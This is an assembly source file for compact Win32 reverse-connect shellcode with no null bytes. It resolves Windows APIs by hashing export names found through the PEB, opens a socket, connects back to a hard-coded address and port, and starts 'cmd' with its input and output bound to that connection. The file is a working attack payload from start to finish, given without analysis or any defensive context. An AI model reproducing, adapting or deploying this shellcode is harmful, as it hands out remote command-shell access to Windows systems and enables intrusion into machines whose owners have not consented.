
        ; saludos a todos en España
        ;
        ; win32 reverse connect shell, no null bytes
        ;
        ; nasm -fbin dx.asm
        ;
        ; assume: eax = offset @entry_point
        ;

        
    bits   32

    ; alloc(124);    
    push   124
    pop    ecx
		sub	   esp, ecx
		mov	   edi, esp
		rep    stosb

    ; WSASocketA();
    push	 1
		push	 2
		call	 ebp
		xchg	 eax, ebx
		
    push   00100007Fh
    push   0D2040002h
    mov	   eax, esp

    ; connect();
    push	 10h
		push	 eax
		push	 ebx
		call	 ebp

    ; CreateProcess();
		xchg	 eax, ebx
		lea	   ebx, [edi-54h]
		lea	   edi, [ebx+38h]
    inc	   dword [ebx+2Dh]
		cdq
		stosd
		stosd
		stosd
		push	 edi
		push	 ebx
		push	 edx
		push	 edx
		push	 edx
		push	 eax
		push	 edx
		push	 edx
		push	 esi
		lodsd
		push	 edx
		call	 ebp

    ; WaitForSingleObject(pi.hProcess, INFINITE);
    push	 -1
		push	 dword [edi]
		call	 ebp
    
    ; ExitThread(eax);
    push   eax
		call	 ebp

get_proc_address:
		lodsd
		pushad
		push	 30h
		pop	   ecx
		mov	   eax, [fs:ecx]
		mov	   eax, [eax+0Ch]
		mov	   esi, [eax+1Ch]
load_dll:
		lodsd
		xchg	 eax, ebx
		lodsd
		lodsd
		xchg	 eax, ebx
		push	 eax

		mov	   eax, [ebx+3Ch]
		mov	   eax, [eax+ebx+78h]
		lea	   esi, [eax+ebx+18h]
		lodsd
		xchg	 eax, ecx
		lodsd
		add	   eax, ebx
		push	 eax
		lodsd
		lea	   edi, [ebx+eax]
		lodsd
		lea	   ebp, [ebx+eax]

load_api:
		mov	   esi, [edi+ecx*4-4]
		add  	 esi, ebx
		xor	   eax, eax
		cdq
hash_api:
		lodsb
		add	   edx, eax
		ror	   edx, 13
		dec	   eax
		jns	   hash_api
    cmp	   edx, [esp+24h]
    loopnz load_api
		pop	   eax
		pop	   esi
		jnz	   load_dll
call_api:
		pop	   eax
		movzx	 edx, word [ebp+ecx*2-2]
		add	   ebx, [eax+edx*4]
		pop	   esi
    pop    edi
    push   ebx
		popad
		jmp	   edi
code_end:
		dd 087C1A5B2h ; WSASocketA
		dd 0E49C80ECh ; connect
		db 'cmd',0h
		dd 01772DFFEh ; CreateProcessA
		dd 05338DA4Bh ; WaitForSingleObject
		dd 0A2CDED6Eh ; CloseHandle
		dd 0DB93EB6Fh ; ExitThread

